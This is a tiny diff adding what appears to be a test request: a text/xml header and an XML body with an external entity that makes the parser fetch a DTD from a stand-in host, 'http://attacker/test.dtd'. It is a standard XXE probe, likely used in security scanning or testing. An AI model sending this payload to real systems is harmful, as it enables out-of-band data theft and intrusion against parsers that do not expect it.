@@ -1,0 +1,3 @@
+Content-Type: text/xml
+
+<?xml version="1.0" encoding="utf-8"?><!DOCTYPE xxetestd [<!ENTITY xxetest SYSTEM "http://attacker/test.dtd">]><foo>&xxetest;</foo>
